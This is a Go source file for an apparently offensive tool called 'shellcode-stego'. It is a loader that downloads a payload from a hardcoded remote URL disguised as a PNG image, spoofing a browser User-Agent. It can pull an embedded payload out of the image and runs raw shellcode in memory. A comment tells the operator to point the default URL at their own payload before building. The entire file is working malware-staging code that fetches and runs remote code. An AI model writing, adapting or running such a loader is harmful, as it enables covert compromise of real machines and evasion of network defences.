package main

import (
	"flag"
	"fmt"
	"shellcode-stego/pkg/extractor"
	"shellcode-stego/pkg/runshellthread"
	"io"
	"net/http"
	"strings"
	"time"
)

const (
	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
	defaultDownloadURL = "https://l.station307.com/RirU4G2PQagVJToLNdUKc5/img.png"
)



// formatBytesAsHex formats a byte slice as a hex string
func formatBytesAsHex(data []byte) string {
	var result strings.Builder
	for i, b := range data {
		result.WriteString(fmt.Sprintf("%02X", b))
		if i < len(data)-1 {
			result.WriteString(" ")
		}
	}
	return result.String()
}

func main() {
	
	// Parse command line flags
	isImagePtr := flag.Bool("image", false, "Specifies whether the payload is embedded in an image file (PNG)")
	isShellcodePtr := flag.Bool("shellcode", false, "Specifies whether the payload is raw shellcode")
	flag.Parse()

	// Get URL from remaining args
	args := flag.Args()

	// Determine downloadURL based on command-line arguments
	var downloadURL string
	if len(args) < 1 {
		downloadURL = defaultDownloadURL
	} else {
		downloadURL = args[0]
		// Basic URL validation
		if !strings.HasPrefix(downloadURL, "http://") && !strings.HasPrefix(downloadURL, "https://") {
			fmt.Println("URL must start with http:// or https://")
			return
		}
	}

	if downloadURL == "" {
		fmt.Println("Error: No download URL provided and no default URL configured")
		flag.Usage()
		return
	}

	// http client to download the payload
	client := &http.Client{
		Timeout: 60 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 30 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	// create the HTTP request with a standard user agent
	req, err := http.NewRequest("GET", downloadURL, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error downloading payload:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Error: HTTP status %d\n", resp.StatusCode)
		return
	}

	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading payload:", err)
		return
	}

	// If payload is embedded in an image, extract it
	if *isImagePtr {
		extractedPayload, err := extractor.ExtractPEFromBytes(payload)
		if err != nil {
			fmt.Println("Error extracting payload from image:", err)
			return
		}
		payload = extractedPayload
	}

	// For shellcode, execute directly using runshellthread
	if *isShellcodePtr {
		_, err := runshellthread.ExecuteShellcode(payload, true)
		if err != nil {
			fmt.Println("Error executing shellcode:", err)
			return
		}

		
		// Give the shellcode some time to start executing before prompting

		time.Sleep(5 * time.Second)
		

		
		// Keep the main process alive
		// This allows the shellcode to continue running even if it doesn't signal completion
		fmt.Scanln() // Wait for user input before exiting
		
		// Cleanup
		return
	}
}
